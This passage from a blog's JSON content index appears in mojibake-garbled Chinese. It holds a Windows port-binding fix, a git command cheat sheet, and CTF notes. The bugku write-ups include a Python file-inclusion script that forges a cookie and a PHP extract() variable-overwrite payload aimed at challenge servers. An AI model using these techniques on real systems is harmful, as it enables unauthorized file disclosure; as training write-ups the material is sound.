æŸ¥çœ‹ç›¸å…³æœåŠ¡ï¼Œæ²¡æœ‰å¯åŠ¨ï¼Œå‘ç°æœ‰æ–°ç¨‹åºæ‰“å¼€ç­‰ç­‰éœ€è¦è¯»å†™å†…å­˜çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šæŠ¥é”™ã€‚ç„¶åç”±äºæ˜¯DELLç¬”è®°æœ¬ï¼Œå°±å»DELLå®˜ç½‘æŸ¥è¯¢ç›¸å…³é©±åŠ¨ç¨‹åºï¼Œä¸‹è½½äº†Inter-Repaid-Storage-Technology-Driver-and-Managerment.exeï¼Œè¿è¡Œå¹¶å°è¯•ä¿®å¤ï¼Œä½†æ˜¯ä¸èµ·ä½œç”¨ æœç´¢åå‘ç°ï¼Œinterå®˜ç½‘æœ‰æ›´å¥½çš„ä¿®å¤å·¥å…·ï¼Œ interå®˜ç½‘ä¿®å¤å·¥å…·f6flpy.zipï¼Œä¸‹è½½å‹ç¼©åŒ…åè§£å‹ï¼Œè¿è¡Œï¼Œç„¶åä¼šæç¤ºé‡å¯ï¼Œé‡å¯åä¸å†æç¤ºé”™è¯¯ï¼Œé—®é¢˜è§£å†³ åŸå› åˆ†æï¼šåº”è¯¥æ˜¯è¯¥ç¨‹åºæ‰©å±•ä¸¢å¤±ï¼Œé€ æˆç¨‹åºå’ŒæœåŠ¡æ— æ³•å¯åŠ¨ï¼Œä¿®å¤å·¥å…·å°†æ‰©å±•è£…å›ï¼ŒæˆåŠŸè§£å†³é—®é¢˜ ç¬¬äºŒå‘é—®é¢˜ï¼šæŸsocksè½¯ä»¶æŠ¥é”™ç”±äºæƒé™ç­‰æ„¿æ„ç»‘å®šæœ¬åœ°ç«¯å£10808å¤±è´¥ï¼Œå¯¼è‡´æµé‡æ— æ³•é€šè¿‡ç¨‹åºã€‚ è§£å†³ï¼š ç®¡ç†å‘˜æƒé™è¿è¡Œpowershellï¼Œè¾“å…¥nestat -ano|findstr â€10808â€œæ— æ˜¾ç¤ºï¼Œæ²¡æœ‰ç¨‹åºå ç”¨ç«¯å£ã€‚ ç¨‹åºæ¢æˆ10800ç«¯å£ä»ç„¶ä¸è¡Œï¼Œå†æ¬¡æŸ¥çœ‹ç«¯å£å ç”¨è¿˜æ˜¯æ²¡æœ‰ç¨‹åºå ç”¨ æ‰“å¼€æ§åˆ¶é¢æ¿-&gt;windows Defender é˜²ç«å¢™-&gt;é«˜çº§è®¾ç½®-&gt;æ·»åŠ UDPå’ŒTCPçš„å…¥ç«™è§„åˆ™ï¼Œé‡å¯ç”µè„‘ï¼Œæ²¡æœ‰è§£å†³ã€‚å¯èƒ½æ˜¯è®¾ç½®äº†å¼€æœºè¿è¡Œçš„ç¼˜æ•… æŠŠå¼€æœºè¿è¡Œå…³é—­ï¼Œé‡å¤ç¬¬ä¸‰æ­¥ï¼Œç­‰å¾…ç³»ç»Ÿå®Œå…¨å¯åŠ¨å†è¿è¡Œè¯¥è½¯ä»¶ï¼Œå‘ç°æ— é—®é¢˜ï¼Œè²Œä¼¼æˆåŠŸè§£å†³ äº‹æƒ…æ²¡è¿™ä¹ˆç®€å•ï¼Œä¸­åˆå†æ¬¡å¼€æœºè¿è¡Œï¼Œä¸‰å››æ­¥éƒ½å°è¯•å‡å¤±æ•ˆï¼Œäºæ˜¯å°è¯•å…¶ä»–è½¯ä»¶èƒ½å¦ç»‘å®šè¿™ä¸ªç«¯å£ å‘ç°å…¶ä»–è½¯ä»¶éƒ½æ— æ³•ç»‘å®šè¿™ä¸ªç«¯å£ï¼Œå¹¶æ˜¾ç¤ºæŠ¥é”™ï¼Œ10808ç«¯å£ä¸ºç³»ç»Ÿé¢„ç•™ç«¯å£ï¼ŒI/Oå †æ ˆé”™è¯¯ é‚åˆ‡æ¢æ€è·¯,å…¶ä»–è½¯ä»¶å¯ä»¥ç»‘å®š1080ç«¯å£ï¼Œé‚£ä¸å¦‚å°±å°†è¯¥è½¯ä»¶ç»‘å®š1080ç«¯å£ï¼Œåˆ‡æ¢ç«¯å£ï¼ŒæˆåŠŸ åˆ†æï¼šæœ¬åº”è¯¥æ—©ä¸€ç‚¹è¿›å…¥ç¬¬ä¸ƒæ­¥ï¼Œä½†æ˜¯é¡¾åŠè¯¥è½¯ä»¶è¿˜éœ€è¦å ç”¨ä¸€ä¸ª10809ç«¯å£ç”¨äºhttpï¼Œä»¥ä¸ºåªåˆ‡æ¢10808ç«¯å£ä¸èƒ½è§£å†³é—®é¢˜ï¼Œå¿˜è®°æ›¾ç»æŸ¥çœ‹è¯¥è½¯ä»¶æºç httpè¦ç”¨çš„10809ä¸ºsocksç»‘å®šçš„ç«¯å£å·+1ï¼Œæµªè´¹äº›è®¸æ—¶é—´ã€‚ æ€»ç»“Windowsçš„æ›´æ–°ï¼šæ–°åŠŸèƒ½ä¸çŸ¥é“æœ‰ä»€ä¹ˆï¼Œbugå€’æ˜¯ç«‹é©¬å‡ºç°/doge","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"}]},{"title":"Gitå¸¸ç”¨å‘½ä»¤æ¸…å•","date":"2019-11-02T16:00:00.000Z","path":"2019/11/03/Note/å¸¸ç”¨gitå‘½ä»¤æ¸…å•/","text":"Gitå¸¸ç”¨å‘½ä»¤æ¸…å•ä¸€ã€æ–°å»ºä»£ç åº“12345678# åœ¨å½“å‰ç›®å½•æ–°å»ºä¸€ä¸ªGitä»£ç åº“git init# æ–°å»ºä¸€ä¸ªç›®å½•ï¼Œå°†å…¶åˆå§‹åŒ–ä¸ºGitä»£ç åº“git init [project-name]# ä¸‹è½½ä¸€ä¸ªé¡¹ç›®å’Œå®ƒçš„æ•´ä¸ªä»£ç å†å²git clone [url] äºŒã€é…ç½®Gitçš„è®¾ç½®æ–‡ä»¶ä¸º.gitconfigï¼Œå®ƒå¯ä»¥åœ¨ç”¨æˆ·ä¸»ç›®å½•ä¸‹ï¼ˆå…¨å±€é…ç½®ï¼‰ï¼Œä¹Ÿå¯ä»¥åœ¨é¡¹ç›®ç›®å½•ä¸‹ï¼ˆé¡¹ç›®é…ç½®ï¼‰ã€‚ 1234567891011121314151617181920212223242526272829# æ˜¾ç¤ºå½“å‰çš„Gité…ç½®git config --list# ç¼–è¾‘Gité…ç½®æ–‡ä»¶git config -e [--global]# è®¾ç½®æäº¤ä»£ç æ—¶çš„ç”¨æˆ·ä¿¡æ¯git config [--global] user.name &quot;[name]&quot;git config [--global] user.email &quot;[email address]&quot;#ä¸ºgité…ç½®å…¨å±€ä»£ç†git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080git config --global https.proxy http:&#x2F;&#x2F;127.0.0.1:1080git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1080#å–æ¶ˆä»£ç†git config --global --unset http.proxygit config --global --unset https.proxy#åªå¯¹github.comgit config --global http.https:&#x2F;&#x2F;github.com.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080#å–æ¶ˆä»£ç†git config --global --unset http.https:&#x2F;&#x2F;github.com.proxy#é…ç½®å®Œä»£ç†åé…ç½®æ–‡ä»¶å°†å‡ºç°ä¸‹é¢ç±»ä¼¼å­—æ®µ[http] proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080[https] proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 ä¸‰ã€å¢åŠ /åˆ é™¤æ–‡ä»¶123456789101112131415161718192021# æ·»åŠ æŒ‡å®šæ–‡ä»¶åˆ°æš‚å­˜åŒºgit add [file1] [file2] ...# æ·»åŠ æŒ‡å®šç›®å½•åˆ°æš‚å­˜åŒºï¼ŒåŒ…æ‹¬å­ç›®å½•git add [dir]# æ·»åŠ å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒºgit add .# æ·»åŠ æ¯ä¸ªå˜åŒ–å‰ï¼Œéƒ½ä¼šè¦æ±‚ç¡®è®¤# å¯¹äºåŒä¸€ä¸ªæ–‡ä»¶çš„å¤šå¤„å˜åŒ–ï¼Œå¯ä»¥å®ç°åˆ†æ¬¡æäº¤git add -p# åˆ é™¤å·¥ä½œåŒºæ–‡ä»¶ï¼Œå¹¶ä¸”å°†è¿™æ¬¡åˆ é™¤æ”¾å…¥æš‚å­˜åŒºgit rm [file1] [file2] ...# åœæ­¢è¿½è¸ªæŒ‡å®šæ–‡ä»¶ï¼Œä½†è¯¥æ–‡ä»¶ä¼šä¿ç•™åœ¨å·¥ä½œåŒºgit rm --cached [file]# æ”¹åæ–‡ä»¶ï¼Œå¹¶ä¸”å°†è¿™ä¸ªæ”¹åæ”¾å…¥æš‚å­˜åŒºgit mv [file-original] [file-renamed] å››ã€ä»£ç æäº¤123456789101112131415161718# æäº¤æš‚å­˜åŒºåˆ°ä»“åº“åŒºgit commit -m [message]# æäº¤æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶åˆ°ä»“åº“åŒºgit commit [file1] [file2] ... -m [message]# æäº¤å·¥ä½œåŒºè‡ªä¸Šæ¬¡commitä¹‹åçš„å˜åŒ–ï¼Œç›´æ¥åˆ°ä»“åº“åŒºgit commit -a# æäº¤æ—¶æ˜¾ç¤ºæ‰€æœ‰diffä¿¡æ¯git commit -v# ä½¿ç”¨ä¸€æ¬¡æ–°çš„commitï¼Œæ›¿ä»£ä¸Šä¸€æ¬¡æäº¤# å¦‚æœä»£ç æ²¡æœ‰ä»»ä½•æ–°å˜åŒ–ï¼Œåˆ™ç”¨æ¥æ”¹å†™ä¸Šä¸€æ¬¡commitçš„æäº¤ä¿¡æ¯git commit --amend -m [message]# é‡åšä¸Šä¸€æ¬¡commitï¼Œå¹¶åŒ…æ‹¬æŒ‡å®šæ–‡ä»¶çš„æ–°å˜åŒ–git commit --amend [file1] [file2] ... äº”ã€åˆ†æ”¯123456789101112131415161718192021222324252627282930313233343536373839404142# åˆ—å‡ºæ‰€æœ‰æœ¬åœ°åˆ†æ”¯git branch# åˆ—å‡ºæ‰€æœ‰è¿œç¨‹åˆ†æ”¯git branch -r# åˆ—å‡ºæ‰€æœ‰æœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹åˆ†æ”¯git branch -a# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œä½†ä¾ç„¶åœç•™åœ¨å½“å‰åˆ†æ”¯git branch [branch-name]# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œå¹¶åˆ‡æ¢åˆ°è¯¥åˆ†æ”¯git checkout -b [branch]# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼ŒæŒ‡å‘æŒ‡å®šcommitgit branch [branch] [commit]# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œä¸æŒ‡å®šçš„è¿œç¨‹åˆ†æ”¯å»ºç«‹è¿½è¸ªå…³ç³»git branch --track [branch] [remote-branch]# åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯ï¼Œå¹¶æ›´æ–°å·¥ä½œåŒºgit checkout [branch-name]# åˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªåˆ†æ”¯git checkout -# å»ºç«‹è¿½è¸ªå…³ç³»ï¼Œåœ¨ç°æœ‰åˆ†æ”¯ä¸æŒ‡å®šçš„è¿œç¨‹åˆ†æ”¯ä¹‹é—´git branch --set-upstream [branch] [remote-branch]# åˆå¹¶æŒ‡å®šåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯git merge [branch]# é€‰æ‹©ä¸€ä¸ªcommitï¼Œåˆå¹¶è¿›å½“å‰åˆ†æ”¯git cherry-pick [commit]# åˆ é™¤åˆ†æ”¯git branch -d [branch-name]# åˆ é™¤è¿œç¨‹åˆ†æ”¯git push origin --delete [branch-name]git branch -dr [remote&#x2F;branch] å…­ã€æ ‡ç­¾1234567891011121314151617181920212223242526# åˆ—å‡ºæ‰€æœ‰taggit tag# æ–°å»ºä¸€ä¸ªtagåœ¨å½“å‰commitgit tag [tag]# æ–°å»ºä¸€ä¸ªtagåœ¨æŒ‡å®šcommitgit tag [tag] [commit]# åˆ é™¤æœ¬åœ°taggit tag -d [tag]# åˆ é™¤è¿œç¨‹taggit push origin :refs&#x2F;tags&#x2F;[tagName]# æŸ¥çœ‹tagä¿¡æ¯git show [tag]# æäº¤æŒ‡å®štaggit push [remote] [tag]# æäº¤æ‰€æœ‰taggit push [remote] --tags# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼ŒæŒ‡å‘æŸä¸ªtaggit checkout -b [branch] [tag] ä¸ƒã€æŸ¥çœ‹ä¿¡æ¯123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# æ˜¾ç¤ºæœ‰å˜æ›´çš„æ–‡ä»¶git status# æ˜¾ç¤ºå½“å‰åˆ†æ”¯çš„ç‰ˆæœ¬å†å²git log# æ˜¾ç¤ºcommitå†å²ï¼Œä»¥åŠæ¯æ¬¡commitå‘ç”Ÿå˜æ›´çš„æ–‡ä»¶git log --stat# æœç´¢æäº¤å†å²ï¼Œæ ¹æ®å…³é”®è¯git log -S [keyword]# æ˜¾ç¤ºæŸä¸ªcommitä¹‹åçš„æ‰€æœ‰å˜åŠ¨ï¼Œæ¯ä¸ªcommitå æ®ä¸€è¡Œgit log [tag] HEAD --pretty&#x3D;format:%s# æ˜¾ç¤ºæŸä¸ªcommitä¹‹åçš„æ‰€æœ‰å˜åŠ¨ï¼Œå…¶&quot;æäº¤è¯´æ˜&quot;å¿…é¡»ç¬¦åˆæœç´¢æ¡ä»¶git log [tag] HEAD --grep feature# æ˜¾ç¤ºæŸä¸ªæ–‡ä»¶çš„ç‰ˆæœ¬å†å²ï¼ŒåŒ…æ‹¬æ–‡ä»¶æ”¹ågit log --follow [file]git whatchanged [file]# æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶ç›¸å…³çš„æ¯ä¸€æ¬¡diffgit log -p [file]# æ˜¾ç¤ºè¿‡å»5æ¬¡æäº¤git log -5 --pretty --oneline# æ˜¾ç¤ºæ‰€æœ‰æäº¤è¿‡çš„ç”¨æˆ·ï¼ŒæŒ‰æäº¤æ¬¡æ•°æ’åºgit shortlog -sn# æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶æ˜¯ä»€ä¹ˆäººåœ¨ä»€ä¹ˆæ—¶é—´ä¿®æ”¹è¿‡git blame [file]# æ˜¾ç¤ºæš‚å­˜åŒºå’Œå·¥ä½œåŒºçš„å·®å¼‚git diff# æ˜¾ç¤ºæš‚å­˜åŒºå’Œä¸Šä¸€ä¸ªcommitçš„å·®å¼‚git diff --cached [file]# æ˜¾ç¤ºå·¥ä½œåŒºä¸å½“å‰åˆ†æ”¯æœ€æ–°commitä¹‹é—´çš„å·®å¼‚git diff HEAD# æ˜¾ç¤ºä¸¤æ¬¡æäº¤ä¹‹é—´çš„å·®å¼‚git diff [first-branch]...[second-branch]# æ˜¾ç¤ºä»Šå¤©ä½ å†™äº†å¤šå°‘è¡Œä»£ç git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;# æ˜¾ç¤ºæŸæ¬¡æäº¤çš„å…ƒæ•°æ®å’Œå†…å®¹å˜åŒ–git show [commit]# æ˜¾ç¤ºæŸæ¬¡æäº¤å‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶git show --name-only [commit]# æ˜¾ç¤ºæŸæ¬¡æäº¤æ—¶ï¼ŒæŸä¸ªæ–‡ä»¶çš„å†…å®¹git show [commit]:[filename]# æ˜¾ç¤ºå½“å‰åˆ†æ”¯çš„æœ€è¿‘å‡ æ¬¡æäº¤git reflog å…«ã€è¿œç¨‹åŒæ­¥1234567891011121314151617181920212223# ä¸‹è½½è¿œç¨‹ä»“åº“çš„æ‰€æœ‰å˜åŠ¨git fetch [remote]# æ˜¾ç¤ºæ‰€æœ‰è¿œç¨‹ä»“åº“git remote -v# æ˜¾ç¤ºæŸä¸ªè¿œç¨‹ä»“åº“çš„ä¿¡æ¯git remote show [remote]# å¢åŠ ä¸€ä¸ªæ–°çš„è¿œç¨‹ä»“åº“ï¼Œå¹¶å‘½ågit remote add [shortname] [url]# å–å›è¿œç¨‹ä»“åº“çš„å˜åŒ–ï¼Œå¹¶ä¸æœ¬åœ°åˆ†æ”¯åˆå¹¶git pull [remote] [branch]# ä¸Šä¼ æœ¬åœ°æŒ‡å®šåˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“git push [remote] [branch]# å¼ºè¡Œæ¨é€å½“å‰åˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“ï¼Œå³ä½¿æœ‰å†²çªgit push [remote] --force# æ¨é€æ‰€æœ‰åˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“git push [remote] --all ä¹ã€æ’¤é”€12345678910111213141516171819202122232425262728293031# æ¢å¤æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶åˆ°å·¥ä½œåŒºgit checkout [file]# æ¢å¤æŸä¸ªcommitçš„æŒ‡å®šæ–‡ä»¶åˆ°æš‚å­˜åŒºå’Œå·¥ä½œåŒºgit checkout [commit] [file]# æ¢å¤æš‚å­˜åŒºçš„æ‰€æœ‰æ–‡ä»¶åˆ°å·¥ä½œåŒºgit checkout .# é‡ç½®æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶ï¼Œä¸ä¸Šä¸€æ¬¡commitä¿æŒä¸€è‡´ï¼Œä½†å·¥ä½œåŒºä¸å˜git reset [file]# é‡ç½®æš‚å­˜åŒºä¸å·¥ä½œåŒºï¼Œä¸ä¸Šä¸€æ¬¡commitä¿æŒä¸€è‡´git reset --hard# é‡ç½®å½“å‰åˆ†æ”¯çš„æŒ‡é’ˆä¸ºæŒ‡å®šcommitï¼ŒåŒæ—¶é‡ç½®æš‚å­˜åŒºï¼Œä½†å·¥ä½œåŒºä¸å˜git reset [commit]# é‡ç½®å½“å‰åˆ†æ”¯çš„HEADä¸ºæŒ‡å®šcommitï¼ŒåŒæ—¶é‡ç½®æš‚å­˜åŒºå’Œå·¥ä½œåŒºï¼Œä¸æŒ‡å®šcommitä¸€è‡´git reset --hard [commit]# é‡ç½®å½“å‰HEADä¸ºæŒ‡å®šcommitï¼Œä½†ä¿æŒæš‚å­˜åŒºå’Œå·¥ä½œåŒºä¸å˜git reset --keep [commit]# æ–°å»ºä¸€ä¸ªcommitï¼Œç”¨æ¥æ’¤é”€æŒ‡å®šcommit# åè€…çš„æ‰€æœ‰å˜åŒ–éƒ½å°†è¢«å‰è€…æŠµæ¶ˆï¼Œå¹¶ä¸”åº”ç”¨åˆ°å½“å‰åˆ†æ”¯git revert [commit]# æš‚æ—¶å°†æœªæäº¤çš„å˜åŒ–ç§»é™¤ï¼Œç¨åå†ç§»å…¥git stashgit stash pop åã€å…¶ä»–12# ç”Ÿæˆä¸€ä¸ªå¯ä¾›å‘å¸ƒçš„å‹ç¼©åŒ…git archive","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"git","slug":"git","permalink":"https://yanmymickey.github.io/tags/git/"}]},{"title":"CTF_note","date":"2019-07-15T16:00:00.000Z","path":"2019/07/16/CTF/ctfæ€»ç»“/","text":"web1.é¢˜ç›®hintå¾ˆé‡è¦ï¼Œå†çœ‹htmlå…ƒç´ å’Œjsæœ‰æ— æç¤ºï¼Œæ ¹æ®ç½‘ç«™æ“ä½œæ¼”ç»ƒä¸€éï¼Œå‘ç°é¡µé¢å›æ˜¾å’Œå¯ç–‘ä¹‹å¤„ã€‚ 2.çœ‹å¤´å’Œè¡¨å•æ•°æ®ã€‚ 3.çœ‹robots.txt 4.æ‰«æŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘ä¹‹å¤„ã€‚ 5.å¸¸è§æ¼æ´æ€»ç»“ï¼š 1.æ–‡ä»¶åŒ…å«æ¼æ´ â€¦/./è¿›è¡Œè·¨ç›®å½• 2.md5ç¢°æ’ï¼Œbase64åŠ å¯†ï¼Œ==åˆ¤æ–­ä¼ æ•°ç»„ 3.cookieså‚æ•°ï¼ŒseesionIDä¿è¯æ•°æ®ä¸åˆ·æ–° 4.Referå’ŒX-Forwardè¦æ±‚æœ¬åœ° mirc1.æ–‡ä»¶éšå†™ 1.æ–‡ä»¶åŒ…å«ï¼ŒjpgåŒ…å«zipï¼ŒdocxåŒ…å«zipã€‚æ³¨æ„æŸ¥çœ‹documentæ–‡ä»¶å¤¹å’Œç›®å½•ä¸‹documentæ–‡ä»¶ã€‚ 2.æ–‡ä»¶å¤´ï¼Œgifï¼Œpngï¼Œexifï¼Œjiffæ ¼å¼æŸåå¤åŸã€‚ 3.æ–‡ä»¶å°¾æ•°æ®å¯ç–‘%urlç¼–ç ï¼Œå¤§å°å†™å­—æ¯baseç¼–ç ï¼Œæ•°å­—è½¬æ¢è¿›åˆ¶ã€‚ 4.æ–‡ä»¶å±æ€§éšè—å¯†ç å’Œæ•°æ®ã€‚ 5.mp3æ–‡ä»¶éšè—æ•°æ®ï¼Œå¯†ç å¦‚3.4.æŸ¥è¯¢ 6.äºŒç»´ç åè½¬ï¼Œå›¾ç‰‡è¿‡æ»¤è‰²å·®ã€‚ 7.å›¾ç‰‡æ˜¾ç¤ºä¸å…¨ï¼Œä¸€æ¬ä¸ºpngï¼Œæ›´æ”¹å®½åº¦å’Œé«˜åº¦ä¸€è‡´ 18.zipå¯†ç çˆ†ç ´ 9.ddåˆ†ç¦»æ–‡ä»¶ï¼Œå‚æ•°è¯´æ˜:ã€ if inputfile è¾“å…¥æ–‡ä»¶ of outputfile è¾“å‡ºæ–‡ä»¶ skip è·³è¿‡å¤šå°‘å­—èŠ‚åˆ†ç¦» ibs è¯»å–æ–‡ä»¶é€Ÿç‡ obs è¾“å‡ºæ–‡ä»¶é€Ÿç‡","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"}]},{"title":"bugku_web11","date":"2019-07-15T16:00:00.000Z","path":"2019/07/16/CTF_WP/bugku_web11/","text":"bugku_web11é¢˜ç›®åœ°å€ï¼šhttp://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ= å¤‡æ³¨ï¼šæˆ‘ç”¨çš„æ˜¯python3 filename=a2V5cy50eHQ=æ–‡ä»¶åŒ…å« å› ä¸ºfilenameä¸€èˆ¬è¯´æ˜æºä»£ç ä¸­æœ‰è¯»å–æ‰“å¼€æ–‡ä»¶çš„å‡½æ•° ä»ä¸‹é¢æºç ä¸­å¯çŸ¥çš„ç¡®å«æœ‰å‡½æ•°file() base64æ ¼å¼å¤§å°å†™å­—æ¯+=/ line=å¯èƒ½ä¸è¯»å–è¡Œæ•°æœ‰å…³ phpå‡½æ•°isset()åˆ¤æ–­æ˜¯éè®¾ç½®å€¼ header urlé‡å®šå‘ in_array ç¬¬ä¸€ä¸ªæ˜¯åŒ¹é…å­—ç¬¦ï¼Œç¬¬äºŒä¸ªæ˜¯æ•°ç»„ file è¯»å–æ–‡ä»¶æ¯ä¸€è¡Œ å°è¯•æ–‡ä»¶è¯»å–çš„æ­¥éª¤cookies é‡Œé¢è¦æœ‰å€¼ margin=margin filename =keys.php keys.phpè¦base64åŠ å¯†a2V5cy5waHA= è·å–çš„index.phpçš„æºç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phperror_reporting(0);$file &#x3D; base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);$file_list &#x3D; array(&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,&#39;2&#39;&#x3D;&gt; &#39;keys.php&#39;); if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;$file_list[2]&#x3D;&#39;keys.php&#39;;&#125; if(in_array($file, $file_list))&#123;$fa &#x3D; file($file);echo $fa[$line];&#125;?&gt;import requestsfor a in range(0,100): index_url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#39;+str(a)+&#39;&amp;filename&#x3D;aW5kZXgucGhw&#39; session &#x3D; requests.session() index &#x3D; session.get(index_url) if index.text!&#x3D;&quot;&quot;: print(index.text) else: break;for a in range(0,100): flag_url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#39;+str(a)+&#39;&amp;filename&#x3D;a2V5cy5waHA&#x3D;&#39; cook &#x3D; &#123; &#39;margin&#39;:&#39;margin&#39; &#125; flag &#x3D; session.get(flag_url,cookies&#x3D;cook) if flag.text!&#x3D;&quot;&quot;: print(flag.text) else: break key=â€™KEY{key_keys}è§£é¢˜æ­¥éª¤æ€»ç»“1.ä¹±ç è¯•ç€è§£ç 2.urlä¸­çš„filenameå°è¯•æ–‡ä»¶åŒ…å«3.ç¼–å†™è„šæœ¬4.ä»£ç å®¡è®¡5.cookieæ»¡è¶³è¦æ±‚6.ç»§ç»­è„šæœ¬å‘é€è·å–keyé¢˜ç›®æ‰€éœ€åŸºç¡€çŸ¥è¯†phpåŸºç¡€è¯­æ³•,å‡½æ•°çœ‹ä¸æ‡‚å¯ä»¥æŸ¥,ä¸æ€¥pythonåŸºç¡€è¯­æ³•,å‡½æ•°çœ‹ä¸æ‡‚å¯ä»¥æŸ¥,ä¸æ€¥requestsåº“åŸºæœ¬æ“ä½œäº†è§£ä¸€ä¸‹è¯´æ˜æ˜¯cookieså’Œsessionhttpçš„responseå’Œrequestï¼Œheadå·¥å…·è§£ç ç½‘ç«™ï¼šæŸä¸ªå¤§ä½¬çš„åšå®¢ https://www.wishingstarmoye.com/","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"bugkuä»£ç å®¡è®¡","date":"2019-07-15T16:00:00.000Z","path":"2019/07/16/CTF_WP/å¼±ç±»å‹ç±»åˆ«æ¼æ´å°ç»“å’Œbugkuä»£ç å®¡è®¡å°ç»“/","text":"bugkuä»£ç å®¡è®¡å†™åœ¨å‰é¢ä¸€ä¸‹åªæ˜¯ä¸ªäººçš„ä¸€ç‚¹æ‹™è§ï¼Œè¯·å¤§ä½¬è½»å–·ï¼Œæ¬¢è¿å¤§ä½¬è¡¥å……ï¼Œå¾ˆå¤šä¸æ°å½“çš„åœ°æ–¹ã€‚ 0x00 extractå˜é‡è¦†ç›–é¢˜ç›®åœ°å€é¢˜ç›®æºç 12345678910111213&lt;?php$flag&#x3D;&#39;xxx&#39;;extract($_GET);if(isset($shiyan))&#123; $content&#x3D;trim(file_get_contents($flag)); if($shiyan&#x3D;&#x3D;$content)&#123; echo&#39;flag&#123;xxx&#125;&#39;; &#125; else&#123; echo&#39;Oh.no&#39;; &#125;&#125;?&gt; writeip æ„é€ payload: http://123.206.87.240:9009/1.php?shjyan=&amp;flag= è¦†ç›–åŸæœ‰çš„flagå˜é‡ï¼Œæ˜¯ç©º==ç©ºæˆç«‹ï¼Œè¾“å‡ºflag flagflag{bugku-dmsj-p2sm3N} extractç”¨æ³•(PHP 4, PHP 5, PHP 7) extract â€” ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ è¯´æ˜1extract ( array &amp;$array [, int $flags &#x3D; EXTR_OVERWRITE [, string $prefix &#x3D; NULL ]] ) : int æœ¬å‡½æ•°ç”¨æ¥å°†å˜é‡ä»æ•°ç»„ä¸­å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚ æ£€æŸ¥æ¯ä¸ªé”®åçœ‹æ˜¯å¦å¯ä»¥ä½œä¸ºä¸€ä¸ªåˆæ³•çš„å˜é‡åï¼ŒåŒæ—¶ä¹Ÿæ£€æŸ¥å’Œç¬¦å·è¡¨ä¸­å·²æœ‰çš„å˜é‡åçš„å†²çªã€‚ å‚æ•° array ä¸€ä¸ªå…³è”æ•°ç»„ã€‚æ­¤å‡½æ•°ä¼šå°†é”®åå½“ä½œå˜é‡åï¼Œå€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚å¯¹æ¯ä¸ªé”®ï¼å€¼å¯¹éƒ½ä¼šåœ¨å½“å‰çš„ç¬¦å·è¡¨ä¸­å»ºç«‹å˜é‡ï¼Œå¹¶å—åˆ° flagså’Œprefixå‚æ•°çš„å½±å“ã€‚å¿…é¡»ä½¿ç”¨å…³è”æ•°ç»„ï¼Œæ•°å­—ç´¢å¼•çš„æ•°ç»„å°†ä¸ä¼šäº§ç”Ÿç»“æœï¼Œé™¤éç”¨äº†EXTR_PREFIX_ALLæˆ–è€…EXTR_PREFIX_INVALIDã€‚ flags å¯¹å¾…éæ³•ï¼æ•°å­—å’Œå†²çªçš„é”®åçš„æ–¹æ³•å°†æ ¹æ®å–å‡ºæ ‡è®°flagså‚æ•°å†³å®šã€‚å¯ä»¥æ˜¯ä»¥ä¸‹å€¼ä¹‹ä¸€ï¼š å‚æ•° è¯´æ˜ EXTR_OVERWRITE å¦‚æœæœ‰å†²çªï¼Œè¦†ç›–å·²æœ‰çš„å˜é‡ã€‚ EXTR_SKIP å¦‚æœæœ‰å†²çªï¼Œä¸è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚ EXTR_PREFIX_SAME 